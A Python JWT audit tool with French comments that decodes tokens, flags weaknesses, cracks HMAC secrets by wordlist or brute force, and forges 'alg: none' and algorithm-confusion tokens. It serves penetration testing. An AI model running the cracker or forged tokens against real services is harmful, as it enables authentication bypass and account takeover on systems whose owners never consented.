#!/usr/bin/env python3
"""
JWT Analyzer & Cracker
=======================
Outil d'audit de sécurité pour tokens JWT : décodage, analyse de vulnérabilités
et test de robustesse du secret HMAC (dictionnaire / brute-force).

A utiliser uniquement sur vos propres systèmes ou dans le cadre d'un test
d'intrusion autorisé.

Usage:
    python jwt_analyzer.py decode <token>
    python jwt_analyzer.py analyze <token>
    python jwt_analyzer.py crack <token> --wordlist rockyou.txt
    python jwt_analyzer.py crack <token> --bruteforce --charset abc123 --max-len 4
    python jwt_analyzer.py forge <token> --alg none
"""

import argparse
import base64
import hashlib
import hmac
import itertools
import json
import sys
import time
from concurrent.futures import ProcessPoolExecutor, as_completed


# --------------------------------------------------------------------------
# utils/base64url.py  (fonctions utilitaires base64url)
# --------------------------------------------------------------------------

def b64url_decode(data: str) -> bytes:
    """Décode une chaîne base64url (avec padding manquant toléré)."""
    padding = "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + padding)


def b64url_encode(data: bytes) -> str:
    """Encode en base64url sans padding (format JWT)."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


# --------------------------------------------------------------------------
# core/decoder.py  (fonction "decoder")
# --------------------------------------------------------------------------

def decoder(token: str) -> dict:
    """
    Décode un JWT en ses trois parties : header, payload, signature.

    Retourne un dict:
        {
            "header": {...},
            "payload": {...},
            "signature_b64": str,
            "header_b64": str,
            "payload_b64": str,
            "signing_input": str,   # "header_b64.payload_b64"
        }
    """
    parts = token.strip().split(".")
    if len(parts) != 3:
        raise ValueError(f"Token JWT invalide : {len(parts)} parties trouvées (3 attendues)")

    header_b64, payload_b64, signature_b64 = parts

    try:
        header = json.loads(b64url_decode(header_b64))
    except Exception as e:
        raise ValueError(f"Impossible de décoder le header : {e}")

    try:
        payload = json.loads(b64url_decode(payload_b64))
    except Exception as e:
        raise ValueError(f"Impossible de décoder le payload : {e}")

    return {
        "header": header,
        "payload": payload,
        "signature_b64": signature_b64,
        "header_b64": header_b64,
        "payload_b64": payload_b64,
        "signing_input": f"{header_b64}.{payload_b64}",
    }


def print_decoded(decoded: dict) -> None:
    print("=== HEADER ===")
    print(json.dumps(decoded["header"], indent=2, ensure_ascii=False))
    print("\n=== PAYLOAD ===")
    print(json.dumps(decoded["payload"], indent=2, ensure_ascii=False))

    exp = decoded["payload"].get("exp")
    if exp:
        exp_str = time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime(exp))
        status = "EXPIRÉ" if exp < time.time() else "valide"
        print(f"\n[exp] {exp_str} ({status})")

    print(f"\n=== SIGNATURE (base64url) ===\n{decoded['signature_b64']}")


# --------------------------------------------------------------------------
# core/analyzer.py  (détection de faiblesses)
# --------------------------------------------------------------------------

WEAK_DEFAULT_SECRETS = [
    "secret", "password", "123456", "changeme", "your-256-bit-secret",
    "jwt_secret", "key", "admin", "test",
]


def analyzer(decoded: dict) -> list:
    """
    Analyse le header/payload et retourne une liste de findings
    (chaque finding est un dict {severity, title, detail}).
    """
    findings = []
    header = decoded["header"]
    payload = decoded["payload"]
    alg = header.get("alg", "").upper()

    # alg: none
    if alg in ("NONE", ""):
        findings.append({
            "severity": "CRITIQUE",
            "title": "Algorithme 'none' détecté ou absent",
            "detail": "Le token n'est pas signé. Si le serveur accepte 'alg: none', "
                      "n'importe qui peut forger un token valide sans connaître le secret.",
        })

    # confusion d'algorithme RS256 -> HS256
    if alg.startswith("HS") and ("kid" in header or "jku" in header or "x5u" in header):
        findings.append({
            "severity": "MOYENNE",
            "title": "Risque de confusion d'algorithme (alg confusion)",
            "detail": "Un algorithme HMAC est utilisé avec des indices de clé asymétrique "
                      "(kid/jku/x5u). Si le serveur accepte HS256 avec la clé publique RSA "
                      "comme secret HMAC, le token peut être forgé.",
        })

    # champs sensibles dans jku / x5u (SSRF / injection potentielle)
    for field in ("jku", "x5u"):
        if field in header:
            findings.append({
                "severity": "HAUTE",
                "title": f"Champ '{field}' présent dans le header",
                "detail": f"Le serveur peut aller chercher la clé de vérification à l'URL "
                          f"indiquée par '{field}': {header.get(field)}. "
                          f"Vérifier que le serveur valide bien le domaine (risque SSRF/injection).",
            })

    # kid suspect (path traversal / injection SQL)
    kid = header.get("kid", "")
    if kid and any(c in str(kid) for c in ["../", "'", '"', ";", "|", "$"]):
        findings.append({
            "severity": "HAUTE",
            "title": "Champ 'kid' contient des caractères suspects",
            "detail": f"kid='{kid}' — potentiel vecteur d'injection (path traversal, SQLi) "
                      f"si le serveur utilise ce champ pour retrouver la clé.",
        })

    # absence d'expiration
    if "exp" not in payload:
        findings.append({
            "severity": "MOYENNE",
            "title": "Pas de champ 'exp' (expiration)",
            "detail": "Le token n'expire jamais. S'il est volé, il reste valide indéfiniment.",
        })
    elif payload["exp"] < time.time():
        findings.append({
            "severity": "INFO",
            "title": "Token expiré",
            "detail": "Ce token a dépassé sa date d'expiration.",
        })

    # expiration excessive (> 24h)
    if "exp" in payload and "iat" in payload:
        lifetime = payload["exp"] - payload["iat"]
        if lifetime > 86400:
            findings.append({
                "severity": "BASSE",
                "title": "Durée de vie du token très longue",
                "detail": f"Le token est valide {lifetime/3600:.1f} heures. "
                          f"Une durée courte limite l'impact d'un vol de token.",
            })

    # algo faible connu
    if alg in ("HS256", "HS384", "HS512"):
        findings.append({
            "severity": "INFO",
            "title": f"Algorithme symétrique {alg}",
            "detail": "Le secret doit être suffisamment long et aléatoire (256 bits recommandé). "
                      "Utilisez la commande 'crack' pour tester sa robustesse.",
        })

    return findings


def print_findings(findings: list) -> None:
    if not findings:
        print("Aucune faiblesse évidente détectée.")
        return
    order = {"CRITIQUE": 0, "HAUTE": 1, "MOYENNE": 2, "BASSE": 3, "INFO": 4}
    for f in sorted(findings, key=lambda x: order.get(x["severity"], 5)):
        print(f"[{f['severity']}] {f['title']}")
        print(f"    -> {f['detail']}\n")


# --------------------------------------------------------------------------
# core/cracker.py  (attaque du secret HMAC)
# --------------------------------------------------------------------------

_ALGO_MAP = {
    "HS256": hashlib.sha256,
    "HS384": hashlib.sha384,
    "HS512": hashlib.sha512,
}


def _check_secret(args):
    """Worker utilisé par le multiprocessing : teste un secret candidat."""
    signing_input, secret, signature_b64, hash_func = args
    computed = hmac.new(secret.encode(errors="ignore"), signing_input.encode(), hash_func).digest()
    computed_b64 = b64url_encode(computed)
    if hmac.compare_digest(computed_b64, signature_b64):
        return secret
    return None


def crack_dictionary(decoded: dict, wordlist_path: str, workers: int = 4) -> str | None:
    """Attaque par dictionnaire sur un token HMAC."""
    alg = decoded["header"].get("alg", "").upper()
    hash_func = _ALGO_MAP.get(alg)
    if hash_func is None:
        raise ValueError(f"Algorithme '{alg}' non supporté pour le cracking HMAC "
                          f"(supportés: {list(_ALGO_MAP)})")

    signing_input = decoded["signing_input"]
    signature_b64 = decoded["signature_b64"]

    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        candidates = [line.strip() for line in f if line.strip()]

    return _run_pool(candidates, signing_input, signature_b64, hash_func, workers)


def crack_bruteforce(decoded: dict, charset: str, max_len: int, workers: int = 4) -> str | None:
    """Attaque par force brute (toutes les combinaisons jusqu'à max_len)."""
    alg = decoded["header"].get("alg", "").upper()
    hash_func = _ALGO_MAP.get(alg)
    if hash_func is None:
        raise ValueError(f"Algorithme '{alg}' non supporté pour le cracking HMAC")

    signing_input = decoded["signing_input"]
    signature_b64 = decoded["signature_b64"]

    for length in range(1, max_len + 1):
        candidates = ("".join(c) for c in itertools.product(charset, repeat=length))
        result = _run_pool(candidates, signing_input, signature_b64, hash_func, workers,
                            batch_size=50000)
        if result:
            return result
    return None


def _run_pool(candidates, signing_input, signature_b64, hash_func, workers, batch_size=None):
    """Distribue les candidats sur plusieurs process pour accélérer le test."""
    def gen_args(batch):
        return [(signing_input, c, signature_b64, hash_func) for c in batch]

    with ProcessPoolExecutor(max_workers=workers) as executor:
        if batch_size is None:
            # dictionnaire déjà en mémoire (liste)
            futures = {executor.submit(_check_secret, a): a for a in gen_args(candidates)}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    for f in futures:
                        f.cancel()
                    return result
        else:
            # brute-force : on traite par lots pour ne pas exploser la mémoire
            batch = []
            for c in candidates:
                batch.append(c)
                if len(batch) >= batch_size:
                    r = _submit_batch(executor, batch, signing_input, signature_b64, hash_func)
                    if r:
                        return r
                    batch = []
            if batch:
                r = _submit_batch(executor, batch, signing_input, signature_b64, hash_func)
                if r:
                    return r
    return None


def _submit_batch(executor, batch, signing_input, signature_b64, hash_func):
    args = [(signing_input, c, signature_b64, hash_func) for c in batch]
    futures = [executor.submit(_check_secret, a) for a in args]
    for future in as_completed(futures):
        result = future.result()
        if result:
            return result
    return None


# --------------------------------------------------------------------------
# attacks/none_alg.py & attacks/alg_confusion.py  (forge de tokens de test)
# --------------------------------------------------------------------------

def forge_none_alg(decoded: dict) -> str:
    """
    Forge un token avec 'alg: none' et signature vide.
    Utile pour vérifier si le serveur cible accepte ce type de token (il ne devrait pas).
    """
    header = dict(decoded["header"])
    header["alg"] = "none"
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = decoded["payload_b64"]
    return f"{header_b64}.{payload_b64}."


def forge_hs256_with_public_key(decoded: dict, public_key_pem: str) -> str:
    """
    Forge un token HS256 en utilisant une clé publique RSA/EC comme secret HMAC.
    Test de la vulnérabilité de confusion d'algorithme (alg confusion).
    """
    header = dict(decoded["header"])
    header["alg"] = "HS256"
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = decoded["payload_b64"]
    signing_input = f"{header_b64}.{payload_b64}"
    signature = hmac.new(public_key_pem.encode(), signing_input.encode(), hashlib.sha256).digest()
    signature_b64 = b64url_encode(signature)
    return f"{signing_input}.{signature_b64}"


# --------------------------------------------------------------------------
# main.py  (CLI)
# --------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="JWT Analyzer & Cracker - audit de sécurité pour tokens JWT"
    )
    sub = parser.add_subparsers(dest="command", required=True)

    p_decode = sub.add_parser("decode", help="Décoder un token JWT")
    p_decode.add_argument("token")

    p_analyze = sub.add_parser("analyze", help="Analyser les faiblesses d'un token")
    p_analyze.add_argument("token")

    p_crack = sub.add_parser("crack", help="Tester la robustesse du secret HMAC")
    p_crack.add_argument("token")
    p_crack.add_argument("--wordlist", help="Chemin vers un fichier dictionnaire")
    p_crack.add_argument("--bruteforce", action="store_true", help="Activer le brute-force")
    p_crack.add_argument("--charset", default="abcdefghijklmnopqrstuvwxyz0123456789",
                          help="Jeu de caractères pour le brute-force")
    p_crack.add_argument("--max-len", type=int, default=4, help="Longueur max pour le brute-force")
    p_crack.add_argument("--workers", type=int, default=4, help="Nombre de process parallèles")

    p_forge = sub.add_parser("forge", help="Forger un token de test (audit)")
    p_forge.add_argument("token")
    p_forge.add_argument("--alg", choices=["none"], required=True)

    args = parser.parse_args()

    try:
        if args.command == "decode":
            decoded = decoder(args.token)
            print_decoded(decoded)

        elif args.command == "analyze":
            decoded = decoder(args.token)
            print_decoded(decoded)
            print("\n=== ANALYSE DE SÉCURITÉ ===")
            findings = analyzer(decoded)
            print_findings(findings)

        elif args.command == "crack":
            decoded = decoder(args.token)
            print(f"[*] Algorithme détecté : {decoded['header'].get('alg')}")

            if args.wordlist:
                print(f"[*] Attaque par dictionnaire : {args.wordlist}")
                start = time.time()
                result = crack_dictionary(decoded, args.wordlist, args.workers)
                elapsed = time.time() - start
                if result:
                    print(f"\n[+] SECRET TROUVÉ : '{result}' (en {elapsed:.2f}s)")
                else:
                    print(f"\n[-] Secret non trouvé dans le dictionnaire ({elapsed:.2f}s)")

            elif args.bruteforce:
                print(f"[*] Brute-force : charset='{args.charset}' max_len={args.max_len}")
                start = time.time()
                result = crack_bruteforce(decoded, args.charset, args.max_len, args.workers)
                elapsed = time.time() - start
                if result:
                    print(f"\n[+] SECRET TROUVÉ : '{result}' (en {elapsed:.2f}s)")
                else:
                    print(f"\n[-] Secret non trouvé ({elapsed:.2f}s)")
            else:
                print("Utilisez --wordlist <fichier> ou --bruteforce", file=sys.stderr)
                sys.exit(1)

        elif args.command == "forge":
            decoded = decoder(args.token)
            if args.alg == "none":
                forged = forge_none_alg(decoded)
                print("[*] Token forgé avec alg=none (à tester contre votre propre serveur) :")
                print(forged)

    except ValueError as e:
        print(f"Erreur : {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()